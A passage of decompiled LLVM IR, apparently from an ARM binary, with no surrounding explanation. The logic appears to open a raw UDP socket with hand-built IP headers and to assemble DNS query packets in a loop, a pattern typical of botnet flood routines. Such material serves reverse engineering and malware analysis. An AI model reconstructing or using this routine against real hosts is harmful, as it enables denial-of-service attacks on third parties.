  store i1 %v9_a654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a654, label %dec_label_pc_aac4, label %dec_label_pc_a65c

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a650, %dec_label_pc_a638
  %v0_a650 = phi i32 [ %v1_a650, %dec_label_pc_a650 ], [ %v0_a628, %dec_label_pc_a638 ]
  %v0_a680 = phi i32 [ %v0_a68029, %dec_label_pc_a650 ], [ 0, %dec_label_pc_a638 ]
  %v0_a660 = phi i32 [ %v0_a66025, %dec_label_pc_a650 ], [ 0, %dec_label_pc_a638 ]
  %v0_a668 = phi i32 [ %v1_a668, %dec_label_pc_a650 ], [ %v2_a638, %dec_label_pc_a638 ]
  %v1_a65c = inttoptr i32 %v0_a668 to i8*
  %v2_a65c = load i8, i8* %v1_a65c, align 1
  %v3_a65c = zext i8 %v2_a65c to i32
  store i32 %v3_a65c, i32* %r3.global-to-local, align 4
  %v2_a660 = icmp eq i32 %v0_a660, 0
  store i1 %v2_a660, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v1_a668 = add i32 %v0_a668, 1
  store i32 %v1_a668, i32* %r2.global-to-local, align 4
  %v1_a66c = add nsw i32 %v3_a65c, -48
  store i32 %v1_a66c, i32* %r1.global-to-local, align 4
  br i1 %v2_a660, label %dec_label_pc_a674, label %dec_label_pc_a684

dec_label_pc_a674:                                ; preds = %dec_label_pc_a65c
  %v7_a674 = icmp eq i8 %v2_a65c, 9
  store i1 %v7_a674, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a674, label %dec_label_pc_a650, label %bb

bb:                                               ; preds = %dec_label_pc_a674
  %v8_a678 = icmp eq i8 %v2_a65c, 32
  store i1 %v8_a678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a678, label %dec_label_pc_a650, label %dec_label_pc_a680

dec_label_pc_a680:                                ; preds = %bb
  %v1_a680 = add i32 %v0_a680, 1
  store i32 %v1_a680, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a65c, %dec_label_pc_a680
  %v0_a68030 = phi i32 [ %v0_a680, %dec_label_pc_a65c ], [ %v1_a680, %dec_label_pc_a680 ]
  %v0_a66026 = phi i32 [ %v0_a660, %dec_label_pc_a65c ], [ %v1_a680, %dec_label_pc_a680 ]
  %v7_a684 = icmp eq i8 %v2_a65c, 46
  store i1 %v7_a684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a684, label %dec_label_pc_a648, label %bb103

bb103:                                            ; preds = %dec_label_pc_a684
  %v8_a688 = icmp eq i32 %v1_a66c, 9
  store i1 %v8_a688, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a66c, 10
  br i1 %tmp, label %dec_label_pc_a648, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a648, %bb103
  %v0_a650.lcssa = phi i32 [ %v1_a664, %dec_label_pc_a648 ], [ %v0_a650, %bb103 ]
  %v2_a694 = sub i32 %v0_a650.lcssa, %v0_a628
  store i32 %v2_a694, i32* @r4, align 4
  %v2_a698 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a638, i32* %r1.global-to-local, align 4
  store i32 %v2_a698, i32* %r0.global-to-local, align 4
  store i32 %v2_a694, i32* %r2.global-to-local, align 4
  %v3_a6a8 = call i32 @function_108bc(i32 %v2_a698, i32 %v2_a638, i32 %v2_a694)
  %v2_a6ac = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6b0 = load i32, i32* @r4, align 4
  %v2_a6b0 = add i32 %v1_a6b0, %v2_a6ac
  store i32 %v2_a6b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a698, i32* @r0, align 4
  %v3_a6bc = add i32 %v2_a6b0, -36
  %v4_a6bc = inttoptr i32 %v3_a6bc to i8*
  store i8 0, i8* %v4_a6bc, align 1
  %v1_a6c0 = call i32 @function_11874(i32 %v2_a698)
  store i32 %v1_a6c0, i32* %r0.global-to-local, align 4
  store i32 %v1_a6c0, i32* @fp, align 4
  br label %dec_label_pc_a6c8

dec_label_pc_a6c811:                              ; preds = %dec_label_pc_aac4
  unreachable

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_ab2c, %dec_label_pc_ab20, %dec_label_pc_ab10, %dec_label_pc_ab00, %dec_label_pc_a690
  %v1_aafc49 = phi i32 [ %v1_aac8, %dec_label_pc_ab2c ], [ %v1_aac8, %dec_label_pc_ab20 ], [ %v1_aac8, %dec_label_pc_ab10 ], [ %v1_aac8, %dec_label_pc_ab00 ], [ %v1_a6c0, %dec_label_pc_a690 ]
  %v0_a6c8 = load i32, i32* @r7, align 4
  %v2_a6c8 = icmp eq i32 %v0_a6c8, 0
  store i1 %v2_a6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a6c8, label %dec_label_pc_aaf0, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6c8
  store i32 %v0_a6c8, i32* %r0.global-to-local, align 4
  %v1_a6d4 = inttoptr i32 %v0_a6c8 to i8*
  %v2_a6d4 = call i32 @function_1084c(i8* %v1_a6d4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d4, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a6e8 = call i32 @function_11aec(i32 2, i32 3, i32 17)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  %v7_a6ec = icmp eq i32 %v3_a6e8, -1
  store i1 %v7_a6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6ec, label %dec_label_pc_aaf0, label %dec_label_pc_a6f8

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a6d0
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a700 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a700, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a714 = call i32 @function_11aa8(i32 %v3_a6e8, i32 0, i32 3, i32 %v6_a700, i32 4)
  store i32 %v5_a714, i32* %r0.global-to-local, align 4
  %v7_a718 = icmp eq i32 %v5_a714, -1
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_aae8, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a6f8
  %v0_a728 = load i32, i32* %sb.global-to-local, align 4
  %v1_a728 = urem i32 %v0_a728, 256
  store i32 %v1_a728, i32* %sb.global-to-local, align 4
  %v3_a730 = mul i32 %v6_a538, 65536
  store i32 %v3_a730, i32* %r3.global-to-local, align 4
  %v5_a73c = trunc i32 %v0_a728 to i8
  %v0_a740 = load i32, i32* @r8, align 4
  %v2_a740 = icmp eq i32 %v0_a740, 0
  store i1 %v2_a740, i1* %cpsr_z.global-to-local, align 1
  %v3_a744 = urem i32 %v7_a4dc, 65536
  store i32 %v3_a744, i32* %r0.global-to-local, align 4
  %v3_a74c = urem i32 %v6_a538, 65536
  store i32 %v3_a74c, i32* %r2.global-to-local, align 4
  %v3_a750 = mul i32 %v6_a550, 65536
  %v3_a754 = mul i32 %v6_a56c, 65536
  store i32 %v3_a754, i32* %ip.global-to-local, align 4
  br i1 %v2_a740, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a720
  %v5_a75c = sext i8 %v5_a73c to i32
  store i32 %v5_a75c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a720, %bb104
  %v2_a788 = phi i32 [ %v3_a74c, %dec_label_pc_a720 ], [ %v5_a75c, %bb104 ]
  %v3_a768 = urem i32 %v6_a550, 65536
  store i32 %v3_a768, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a770 = urem i32 %v6_a56c, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a788 = load i32, i32* @r6, align 4
  br i1 %v2_a740, label %.dec_label_pc_a970.preheader_crit_edge, label %dec_label_pc_a790

.dec_label_pc_a970.preheader_crit_edge:           ; preds = %bb105
  %v3_a788 = add i32 %v1_a788, %v2_a788
  store i32 %v3_a788, i32* @r7, align 4
  %.pre = sext i8 %v5_a73c to i32
  br label %dec_label_pc_a970.preheader

dec_label_pc_a790:                                ; preds = %bb105
  %v2_a790 = add i32 %v1_a788, %v1_a728
  %v3_a794 = mul i32 %v2_a790, 65536
  %v1_a79c = add i32 %v3_a794, 1769472
  %v1_a7a0 = add i32 %v3_a794, 3080192
  %tmp106 = udiv i32 %v1_a7a0, 256
  %v3_a7b4 = and i32 %tmp106, 65280
  %v4_a7c4 = udiv i32 %v1_a7a0, 16777216
  %v5_a7c4 = or i32 %v3_a7b4, %v4_a7c4
  store i32 %v5_a7c4, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a538 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a4dc, 256
  %v3_a7d8 = and i32 %tmp107, 65280
  store i32 %v3_a7d8, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a4dc, 256
  %v4_a7dc = urem i32 %tmp108, 256
  %v5_a7dc = or i32 %v4_a7dc, %v3_a7d8
  store i32 %v5_a7dc, i32* @sb, align 4
  store i32 %v3_a754, i32* %r2.global-to-local, align 4
  store i32 %v3_a750, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a550, 256
  %v3_a7f0 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a56c, 256
  %v3_a7f4 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a79c, 256
  %v3_a7f8 = and i32 %tmp111, 65280
  store i32 %v3_a7f8, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a550, 256
  %v4_a7fc = urem i32 %tmp112, 256
  %v5_a7fc = or i32 %v4_a7fc, %v3_a7f0
  store i32 %v5_a7fc, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a56c, 256
  %v4_a800 = urem i32 %tmp113, 256
  %v5_a800 = or i32 %v4_a800, %v3_a7f4
  store i32 %v5_a800, i32* @r4, align 4
  %v1_a804 = add i32 %v1_a788, 1
  store i32 %v1_a804, i32* %r3.global-to-local, align 4
  %v4_a808 = udiv i32 %v1_a79c, 16777216
  %v5_a808 = or i32 %v4_a808, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4b8, 16777216
  %v4_a860 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a4f4, 16777216
  %v4_a86c = sdiv i32 %sext8, 16777216
  %v4_a88c = sext i8 %v5_a73c to i32
  %sext9 = mul nuw i32 %v5_a7fc, 65536
  %v7_a8a0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a800, 65536
  %v4_a8c8 = sdiv i32 %sext10, 65536
  %v1_a868 = trunc i32 %v4_a860 to i8
  %extract.t = trunc i32 %v4_a86c to i8
  %v1_a890 = add nsw i32 %v4_a88c, 41
  %sext120 = mul i32 %v5_a808, 65536
  %v3_a8a0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %dec_label_pc_a940, %dec_label_pc_a790
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a828 = call i32 @function_12654(i32 600, i32 1)
  store i32 %v2_a828, i32* %r0.global-to-local, align 4
  store i32 %v2_a4a0, i32* %ip.global-to-local, align 4
  %v3_a830 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v2_a834 = load i32, i32* @r5, align 4
  %v5_a834 = mul i32 %v2_a834, 4
  %v6_a834 = add i32 %v5_a834, %v2_a4a0
  %v7_a834 = inttoptr i32 %v6_a834 to i32*
  store i32 %v2_a828, i32* %v7_a834, align 4
  %v0_a838 = load i32, i32* %ip.global-to-local, align 4
  %v1_a838 = load i32, i32* %r3.global-to-local, align 4
  %v4_a838 = mul i32 %v1_a838, 4
  %v5_a838 = add i32 %v4_a838, %v0_a838
  %v6_a838 = inttoptr i32 %v5_a838 to i32*
  %v7_a838 = load i32, i32* %v6_a838, align 4
  store i32 %v7_a838, i32* %r1.global-to-local, align 4
  %v1_a83c = inttoptr i32 %v7_a838 to i8*
  %v2_a83c = load i8, i8* %v1_a83c, align 1
  %tmp127 = urem i8 %v2_a83c, 16
  %v1_a840 = zext i8 %tmp127 to i32
  %v1_a844 = or i32 %v1_a840, 64
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v1_a848 = trunc i32 %v1_a844 to i8
  store i8 %v1_a848, i8* %v1_a83c, align 1
  %v0_a84c = load i32, i32* %r1.global-to-local, align 4
  %v1_a84c = inttoptr i32 %v0_a84c to i8*
  %v2_a84c = load i8, i8* %v1_a84c, align 1
  %v3_a84c = zext i8 %v2_a84c to i32
  %v1_a850 = and i32 %v3_a84c, 240
  %v1_a854 = or i32 %v1_a850, 5
  store i32 %v1_a854, i32* %r3.global-to-local, align 4
  store i32 %v1_a520, i32* %lr.global-to-local, align 4
  %v1_a85c = trunc i32 %v1_a854 to i8
  store i8 %v1_a85c, i8* %v1_a84c, align 1
  store i32 %v4_a860, i32* %r0.global-to-local, align 4
  %v0_a864 = load i32, i32* %lr.global-to-local, align 4
  %v2_a864 = icmp eq i32 %v0_a864, 0
  store i1 %v2_a864, i1* %cpsr_z.global-to-local, align 1
  %v2_a868 = load i32, i32* %r1.global-to-local, align 4
  %v3_a868 = add i32 %v2_a868, 1
  %v4_a868 = inttoptr i32 %v3_a868 to i8*
  store i8 %v1_a868, i8* %v4_a868, align 1
  store i32 %v4_a86c, i32* %r2.global-to-local, align 4
  %v0_a870 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a870, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a820
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a874 = load i32, i32* %r1.global-to-local, align 4
  %v4_a874 = add i32 %v3_a874, 6
  %v5_a874 = inttoptr i32 %v4_a874 to i16*
  store i16 64, i16* %v5_a874, align 2
  %v0_a87c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a87c.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a820, %bb114
  %v0_a87c.off0 = phi i8 [ %extract.t, %dec_label_pc_a820 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a87c = load i32, i32* %r1.global-to-local, align 4
  %v3_a87c = add i32 %v2_a87c, 8
  %v4_a87c = inttoptr i32 %v3_a87c to i8*
  store i8 %v0_a87c.off0, i8* %v4_a87c, align 1
  %v0_a880 = load i32, i32* %r3.global-to-local, align 4
  %v1_a880 = trunc i32 %v0_a880 to i8
  %v2_a880 = load i32, i32* %r1.global-to-local, align 4
  %v3_a880 = add i32 %v2_a880, 9
  %v4_a880 = inttoptr i32 %v3_a880 to i8*
  store i8 %v1_a880, i8* %v4_a880, align 1
  %v2_a888 = load i32, i32* @global_var_212d8.45, align 4
  %v0_a890 = load i32, i32* %r1.global-to-local, align 4
  %v2_a894 = add i32 %v1_a890, %v0_a890
  store i32 %v2_a894, i32* @r4, align 4
  %v2_a898 = add i32 %v0_a890, 12
  %v3_a898 = inttoptr i32 %v2_a898 to i32*
  store i32 %v2_a888, i32* %v3_a898, align 4
  store i32 %v3_a8a0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8a0, i32* %r3.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8a4 = add i32 %v0_a8a4, 20
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  %v0_a8a8 = load i32, i32* @sl, align 4
  %v1_a8a8 = trunc i32 %v0_a8a8 to i16
  %v3_a8a8 = add i32 %v0_a8a4, 2
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i16*
  store i16 %v1_a8a8, i16* %v4_a8a8, align 2
  %v0_a8ac = load i32, i32* @sb, align 4
  %v1_a8ac = trunc i32 %v0_a8ac to i16
  %v2_a8ac = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ac = add i32 %v2_a8ac, 4
  %v4_a8ac = inttoptr i32 %v3_a8ac to i16*
  store i16 %v1_a8ac, i16* %v4_a8ac, align 2
  %v0_a8b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8b0 = trunc i32 %v0_a8b0 to i16
  %v2_a8b0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8b0 = add i32 %v2_a8b0, 4
  %v4_a8b0 = inttoptr i32 %v3_a8b0 to i16*
  store i16 %v1_a8b0, i16* %v4_a8b0, align 2
  %v0_a8b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8b4 = trunc i32 %v0_a8b4 to i16
  %v2_a8b4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8b4 = add i32 %v2_a8b4, 2
  %v4_a8b4 = inttoptr i32 %v3_a8b4 to i16*
  store i16 %v1_a8b4, i16* %v4_a8b4, align 2
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 20
  %v4_a8bc = inttoptr i32 %v3_a8bc to i16*
  store i16 %rev, i16* %v4_a8bc, align 2
  store i32 %v4_a88c, i32* %ip.global-to-local, align 4
  %v0_a8c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8c4 = add i32 %v0_a8c4, 28
  store i32 %v1_a8c4, i32* %r0.global-to-local, align 4
  store i32 %v4_a8c8, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a8d4 = add i32 %v0_a8c4, 30
  %v4_a8d4 = inttoptr i32 %v3_a8d4 to i16*
  store i16 1, i16* %v4_a8d4, align 2
  %v0_a8d8 = load i32, i32* @lr, align 4
  %v1_a8d8 = trunc i32 %v0_a8d8 to i16
  %v2_a8d8 = load i32, i32* %r0.global-to-local, align 4
  %v3_a8d8 = add i32 %v2_a8d8, 4
  %v4_a8d8 = inttoptr i32 %v3_a8d8 to i16*
  store i16 %v1_a8d8, i16* %v4_a8d8, align 2
  %v0_a8dc = load i32, i32* %ip.global-to-local, align 4
  %v1_a8dc = trunc i32 %v0_a8dc to i8
  %v2_a8dc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8dc = add i32 %v2_a8dc, 40
  %v4_a8dc = inttoptr i32 %v3_a8dc to i8*
  store i8 %v1_a8dc, i8* %v4_a8dc, align 1
  %v0_a8e0 = load i32, i32* @fp, align 4
  %v1_a8e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8e0 = add i32 %v1_a8e0, 16
  %v3_a8e0 = inttoptr i32 %v2_a8e0 to i32*
  store i32 %v0_a8e0, i32* %v3_a8e0, align 4
  %v0_a8e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8e4 = trunc i32 %v0_a8e4 to i16
  %v2_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8e4 = add i32 %v2_a8e4, 28
  %v4_a8e4 = inttoptr i32 %v3_a8e4 to i16*
  store i16 %v1_a8e4, i16* %v4_a8e4, align 2
  %v0_a8e8 = load i32, i32* @r4, align 4
  %v1_a8e8 = add i32 %v0_a8e8, 1
  store i32 %v1_a8e8, i32* %r0.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r7, align 4
  store i32 %v0_a8ec, i32* %r1.global-to-local, align 4
  store i32 %v1_a804, i32* %r2.global-to-local, align 4
  %v3_a8f4 = call i32 @function_108bc(i32 %v1_a8e8, i32 %v0_a8ec, i32 %v1_a804)
  store i32 %v3_a8f4, i32* %r0.global-to-local, align 4
  %v0_a8f8 = load i32, i32* @r6, align 4
  %v2_a8f8 = icmp eq i32 %v0_a8f8, 0
  store i1 %v2_a8f8, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a8f8, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a908

bb116:                                            ; preds = %.thread13
  %v5_a8fc = load i32, i32* @r4, align 4
  store i32 %v5_a8fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a940

dec_label_pc_a908:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a90c = load i32, i32* @r4, align 4
  store i32 %v0_a90c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a914

dec_label_pc_a914:                                ; preds = %.thread20, %dec_label_pc_a908
  %v0_a920 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a908 ]
  %v0_a924 = phi i32 [ %v0_a938, %.thread20 ], [ 0, %dec_label_pc_a908 ]
  %v1_a914 = load i32, i32* @r7, align 4
  %v2_a914 = add i32 %v1_a914, %v0_a924
  %v3_a914 = inttoptr i32 %v2_a914 to i8*
  %v4_a914 = load i8, i8* %v3_a914, align 1
  %v6_a914 = zext i8 %v4_a914 to i32
  store i32 %v6_a914, i32* %r3.global-to-local, align 4
  %v7_a918 = icmp eq i8 %v4_a914, 46
  store i1 %v7_a918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a918, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a914
  %v1_a92016 = add nsw i32 %v0_a920, 1
  store i32 %v1_a92016, i32* %r2.global-to-local, align 4
  %v1_a92418 = add i32 %v0_a924, 1
  store i32 %v1_a92418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a914
  %v2_a91c = load i32, i32* @r4, align 4
  %v3_a91c = add i32 %v2_a91c, %v0_a924
  store i32 %v3_a91c, i32* %r3.global-to-local, align 4
  %v1_a920 = add nsw i32 %v0_a920, 1
  store i32 %v1_a920, i32* %r2.global-to-local, align 4
  %v1_a924 = add i32 %v0_a924, 1
  store i32 %v1_a924, i32* %r1.global-to-local, align 4
  %v2_a928 = trunc i32 %v0_a920 to i8
  %v3_a928 = load i32, i32* %r0.global-to-local, align 4
  %v4_a928 = inttoptr i32 %v3_a928 to i8*
  store i8 %v2_a928, i8* %v4_a928, align 1
  %v0_a92c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a92c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a92c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a92c = phi i32 [ %v1_a92c.pre, %bb117.bb118_crit_edge ], [ %v1_a92016, %.thread59 ]
  %v2_a92c = urem i32 %v1_a92c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a930 = load i32, i32* %r3.global-to-local, align 4
  %v2_a930 = add i32 %v1_a930, 1
  store i32 %v2_a930, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a92c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a938 = load i32, i32* %r1.global-to-local, align 4
  %v1_a938 = load i32, i32* @r6, align 4
  %v9_a938 = icmp eq i32 %v0_a938, %v1_a938
  store i1 %v9_a938, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a938, label %dec_label_pc_a940.loopexit, label %dec_label_pc_a914

dec_label_pc_a940.loopexit:                       ; preds = %.thread20
  %v2_a940.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a940

dec_label_pc_a940:                                ; preds = %bb116, %dec_label_pc_a940.loopexit
  %v0_a940.off0 = phi i8 [ %extract.t126, %dec_label_pc_a940.loopexit ], [ 0, %bb116 ]
  %v2_a940 = phi i32 [ %v2_a940.pre, %dec_label_pc_a940.loopexit ], [ %v5_a8fc, %bb116 ]
  %v3_a940 = inttoptr i32 %v2_a940 to i8*
  store i8 %v0_a940.off0, i8* %v3_a940, align 1
  %v3_a944 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a944, i32* %r3.global-to-local, align 4
  %v1_a948 = add i32 %v3_a944, 1
  store i32 %v1_a948, i32* @r5, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  %v1_a94c = load i32, i32* @r6, align 4
  %v2_a94c = add i32 %v1_a94c, %v0_a94c
  store i32 %v2_a94c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a954 = load i32, i32* @r8, align 4
  %v9_a954 = icmp eq i32 %v0_a954, %v1_a948
  store i1 %v9_a954, i1* %cpsr_z.global-to-local, align 1
  %v3_a958 = add i32 %v2_a94c, 4
  %v4_a958 = inttoptr i32 %v3_a958 to i16*
  store i16 256, i16* %v4_a958, align 2
  %v0_a95c = load i32, i32* @lr, align 4
  %v1_a95c = trunc i32 %v0_a95c to i16
  %v2_a95c = load i32, i32* %r2.global-to-local, align 4
  %v3_a95c = add i32 %v2_a95c, 2
  %v4_a95c = inttoptr i32 %v3_a95c to i16*
  store i16 %v1_a95c, i16* %v4_a95c, align 2
  %v0_a960 = load i32, i32* @r5, align 4
  store i32 %v0_a960, i32* %stack_var_-44, align 4
  %v8_a964 = icmp sgt i32 %v0_a954, %v1_a948
  br i1 %v8_a964, label %dec_label_pc_a820, label %dec_label_pc_a968

dec_label_pc_a968:                                ; preds = %dec_label_pc_a940
  store i32 %v4_a88c, i32* %r0.global-to-local, align 4
  %v0_a96c = load i32, i32* @r6, align 4
  %v2_a96c = add i32 %v0_a96c, %v4_a88c
  store i32 %v2_a96c, i32* @r7, align 4
  %v0_a974.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a970.preheader

dec_label_pc_a970.preheader:                      ; preds = %.dec_label_pc_a970.preheader_crit_edge, %dec_label_pc_a968
  %v4_a9d4.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a970.preheader_crit_edge ], [ %v4_a88c, %dec_label_pc_a968 ]
  %v0_a974.pre = phi i32 [ 0, %.dec_label_pc_a970.preheader_crit_edge ], [ %v0_a974.pre.pre, %dec_label_pc_a968 ]
  %v3_a9a0 = icmp eq i32 %v3_a744, 65535
  %v3_a9b0 = icmp eq i32 %v3_a74c, 65535
  br label %dec_label_pc_a970

dec_label_pc_a970:                                ; preds = %dec_label_pc_a970, %dec_label_pc_aa68, %dec_label_pc_a970.preheader
  %v0_a974 = phi i32 [ %v0_a974.pre, %dec_label_pc_a970.preheader ], [ 0, %dec_label_pc_aa68 ], [ 0, %dec_label_pc_a970 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a974 = icmp eq i32 %v0_a974, 0
  store i1 %v2_a974, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a974, label %dec_label_pc_a970, label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %dec_label_pc_a970, %dec_label_pc_aa68
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a984 = load i32, i32* @r7, align 4
  %v1_a984 = add i32 %v0_a984, 27
  store i32 %v1_a984, i32* @sb, align 4
  %v1_a988 = add i32 %v0_a984, 47
  store i32 %v1_a988, i32* @sl, align 4
  br label %dec_label_pc_a98c

dec_label_pc_a98c:                                ; preds = %dec_label_pc_a9d0, %dec_label_pc_a980
  %v1_a998 = phi i32 [ %v1_aa58, %dec_label_pc_a9d0 ], [ 0, %dec_label_pc_a980 ]
  store i32 %v2_a4a0, i32* %r3.global-to-local, align 4
  store i32 %v3_a744, i32* %ip.global-to-local, align 4
  %v4_a998 = mul i32 %v1_a998, 4
  %v5_a998 = add i32 %v4_a998, %v2_a4a0
  %v6_a998 = inttoptr i32 %v5_a998 to i32*
  %v7_a998 = load i32, i32* %v6_a998, align 4
  store i32 %v7_a998, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9a0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9a4 = add i32 %v7_a998, 20
  store i32 %v1_a9a4, i32* @r6, align 4
  br i1 %v3_a9a0, label %dec_label_pc_aa7c, label %dec_label_pc_a9ac

dec_label_pc_a9ac:                                ; preds = %dec_label_pc_a98c
  store i32 %v3_a74c, i32* @lr, align 4
  store i1 %v3_a9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9b0, label %dec_label_pc_aa90, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge, %dec_label_pc_a9ac
  %v1_a9bc = phi i32 [ %v1_a9bc.pre, %dec_label_pc_aa7c.dec_label_pc_a9b8_crit_edge ], [ 65535, %dec_label_pc_a9ac ]
  store i32 %v3_a768, i32* %r0.global-to-local, align 4
  %v9_a9bc = icmp eq i32 %v3_a768, %v1_a9bc
  store i1 %v9_a9bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9bc, label %dec_label_pc_aaa4, label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_a9b8
  %v1_a9c8 = phi i32 [ %v1_aa9c, %dec_label_pc_aa90 ], [ %v1_a9bc, %dec_label_pc_a9b8 ]
  store i32 %v3_a770, i32* %r2.global-to-local, align 4
  %v9_a9c8 = icmp eq i32 %v3_a770, %v1_a9c8
  store i1 %v9_a9c8, i1* %cpsr_z.global-to-local, align 1
